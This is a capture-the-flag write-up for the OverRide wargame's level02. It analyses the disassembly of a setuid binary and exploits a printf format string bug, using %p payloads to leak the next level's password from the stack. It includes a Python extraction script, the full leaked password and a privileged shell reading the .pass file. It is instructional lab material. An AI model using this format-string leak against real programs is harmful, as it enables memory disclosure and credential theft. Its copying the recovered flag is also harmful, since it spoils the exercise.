# Level02 - Format String Vulnerability

## Binary Analysis

This is an **x64 binary** that requires authentication to access the next level.

```bash
ls -la
-rwsr-s---+ 1 level03 users  7503 Sep 10  2016 level02
```

### Program Behavior

1. Opens and reads `/home/users/level03/.pass` file
2. Prompts for username input
3. Prompts for password input  
4. Compares password with file contents
5. If correct: prints success and spawns shell
6. If wrong: prints username and exits

### Key Code Analysis

```bash
; File operations
0x400898 <+132>: mov    $0x400bb0,%edx    ; "r"
0x40089d <+137>: mov    $0x400bb2,%eax    ; "/home/users/level03/.pass"
0x4008a8 <+148>: callq  0x400700 <fopen@plt>
0x400901 <+237>: callq  0x400690 <fread@plt>  ; Read 0x29 (41) bytes

; Username input
0x4009cd <+441>: lea    -0x70(%rbp),%rax     ; Username buffer at RBP-0x70
0x4009d1 <+445>: mov    $0x64,%esi           ; 100 bytes allowed
0x4009d9 <+453>: callq  0x4006f0 <fgets@plt>

; Password input
0x400a10 <+508>: lea    -0x110(%rbp),%rax    ; Password buffer at RBP-0x110
0x400a17 <+515>: mov    $0x64,%esi           ; 100 bytes allowed
0x400a1f <+523>: callq  0x4006f0 <fgets@plt>

; Comparison
0x400a4a <+566>: lea    -0x110(%rbp),%rcx    ; Our password input
0x400a51 <+573>: lea    -0xa0(%rbp),%rax     ; File password (RBP-0xa0)
0x400a58 <+580>: mov    $0x29,%edx           ; Compare 41 bytes (5 qword password we want)
0x400a63 <+591>: callq  0x400670 <strncmp@plt>
0x400a68 <+596>: test   %eax,%eax
0x400a6a <+598>: jne    0x400a96 <main+642>  ; Jump if wrong

; Success path (correct password)
0x400a71 <+605>: lea    -0x70(%rbp),%rdx     ; Username
0x400a75 <+609>: mov    %rdx,%rsi
0x400a78 <+612>: mov    %rax,%rdi            ; Format string
0x400a80 <+620>: callq  0x4006c0 <printf@plt>; Safe: printf(format, username)
0x400a8a <+630>: callq  0x4006b0 <system@plt>; Spawn shell

; Failure path (wrong password)
0x400a96 <+642>: lea    -0x70(%rbp),%rax     ; Username
0x400a9a <+646>: mov    %rax,%rdi
0x400aa2 <+654>: callq  0x4006c0 <printf@plt>; VULNERABLE: printf(username)
0x400aac <+664>: callq  0x400680 <puts@plt>  ; "does not have access!"
```

## Vulnerability: Format String Exploit

The vulnerability is at `0x400aa2`:
```c
printf(username);  // No format string! Direct user input to printf
```

This allows us to use format specifiers like `%p` to leak stack memory.

## Memory Layout

```
High Memory
|-------------------------|
|   Return Address        |
|-------------------------|
|   Saved RBP             |
|-------------------------|
|   ...                   |
|-------------------------|
|   Password from file    | ← RBP-0xa0 (41 bytes of flag)
|   (41 bytes)            |   THIS IS WHAT WE WANT!
|-------------------------|
|   ...                   |
|   (48 bytes gap)        |
|   ...                   |
|-------------------------|
|   Username buffer       | ← RBP-0x70 (our input with %p)
|   (100 bytes)           |
|-------------------------|
|   ...                   |
|-------------------------|
|   Password input buffer | ← RBP-0x110 (not used in exploit)
|   (100 bytes)           |
|-------------------------|
Low Memory
```

### Buffer Offsets

- Username buffer: `RBP-0x70`
- File password: `RBP-0xa0`
- Password input: `RBP-0x110`

**Byte distance**: `0xa0 - 0x70 = 0x30 = 48 bytes`

48 / 8 = 6 so i expect the password start at index 7+ 

will this is not the actual offset we have format string x64 call

## Format String Position Calculation

### x64 Calling Convention

In x64 architecture, the first 6 arguments are passed in registers:
1. `%rdi` - 1st argument (format string pointer - our username)
2. `%rsi` - 2nd argument
3. `%rdx` - 3rd argument
4. `%rcx` - 4th argument
5. `%r8` - 5th argument
6. `%r9` - 6th argument
7+. Stack arguments (starting at `RSP`)

When we use `%p` format specifiers:
- `%p` #1-6: Read from registers
- `%p` #7+: Read from stack

### Why Position 21, Not 6?

**Initial calculation** (misleading again):
```
Byte offset: 48 bytes
Qword offset: 48 / 8 = 6 qwords
Expected position: 6 + 6 (registers) = 12?
```

**But this is wrong!** The 48-byte offset is from `RBP`, not from where `RSP` points during `printf`.

### Finding the Correct Position

Test with increasing `%p` count:

```bash
# Try position 20
python -c "print('%p ' * 20)" | ./level02
# Output shows positions 1-20, but no password yet

# Try position 30
python -c "print('%p ' * 30)" | ./level02
# Position 21-25 show hex values that look like ASCII!
```

**Result**: Password appears at **positions 21-25** (5 qwords for 41 bytes)

### Stack Frame Analysis

The actual stack layout when `printf` is called:

```
RSP (during printf) → [various local variables and saved registers]
                      [14 qwords of stack data]          ← Positions 7-20
                      [Password from file - 5 qwords]    ← Positions 21-25 
                      [more stack data]
```

The password is **15 qwords away** from RSP, which means:
- 6 register positions (1-6)
- 14 stack positions (7-20)
- **Position 21 starts the password!**

## Exploitation

### Method 1: Manual Extraction

```bash
level02@OverRide:~$ python -c "print('%p ' * 30)" | ./level02
===== [ Secure Access System v1.0 ] =====
/***************************************\
| You must login to access this system. |
\**************************************/
--[ Username: --[ Password: *****************************************
0x7fffffffe4f0 (nil) (nil) 0x2a2a2a2a2a2a2a2a 0x2a2a2a2a2a2a2a2a 
0x7fffffffe6e8 0x1f7ff9a08 (nil) (nil) (nil) (nil) (nil) (nil) (nil) 
(nil) (nil) (nil) (nil) (nil) 0x100000000 (nil) 
0x756e505234376848    ← Position 21
0x45414a3561733951    ← Position 22
0x377a7143574e6758    ← Position 23
0x354a35686e475873    ← Position 24
0x48336750664b394d    ← Position 25
0xfeff00 0x7025207025207025 0x2520702520702520 0x2070252070252070  
does not have access!
```

### Manual Conversion (Understanding Little-Endian)

The hex values are stored in **little-endian** format (least significant byte first):

```bash
# Position 21: 0x756e505234376848
# Read bytes right to left: 48 68 37 34 52 50 6e 75
echo "48 68 37 34 52 50 6e 75" | xxd -r -p; echo
# Output: Hh74RPnu

# Position 22: 0x45414a3561733951
echo "51 39 73 61 35 4a 41 45" | xxd -r -p; echo
# Output: Q9sa5JAE

# Position 23: 0x377a7143574e6758
echo "58 67 4e 57 43 71 7a 37" | xxd -r -p; echo
# Output: XgNWCqz7

# Position 24: 0x354a35686e475873
echo "73 58 47 6e 68 35 4a 35" | xxd -r -p; echo
# Output: sXGnh5J5

# Position 25: 0x48336750664b394d
echo "4d 39 4b 66 50 67 33 48" | xxd -r -p; echo
# Output: M9KfPg3H
```

in this case w need to revert all the bytes one by one from little-indian 

### Method 2: Automated Password Extraction

we can put this python script at /tmp and run it to get the password as string 

```python

#!/usr/bin/env python2
import subprocess
import struct
import re

cmd = 'python -c "print(\'%p \' * 30)" | /home/users/level02/level02 | awk \'{for(i=21;i<=26;i++) printf $(i)" "; print ""}\''
process = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
output, _ = process.communicate()
output = output.decode().strip()

print("Raw extracted values (positions 21-25): {}".format(output))

hex_values = re.findall(r'0x[0-9a-f]+', output)

print("\nPassword hex values (positions 21-25):")
for i, hex_val in enumerate(hex_values, 21):
    print("Position {}: {}".format(i, hex_val))

password = ""
for hex_val in hex_values:
    val = int(hex_val, 16)
    try:
        ascii_bytes = struct.pack('<Q', val)
        for byte in ascii_bytes:
            if 32 <= ord(byte) <= 126:
                password += byte
    except:
        pass

print("\nExtracted Password: {}".format(password))
print("Length: {} characters".format(len(password)))
```

**Complete password**: `Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H`

## Verification

```bash
level02@OverRide:~$ ./level02 
===== [ Secure Access System v1.0 ] =====
/***************************************\
| You must login to access this system. |
\**************************************/
--[ Username: anything
--[ Password: Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
*****************************************
Greetings, anything!
$ whoami
level03
$ cat /home/users/level03/.pass
Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
```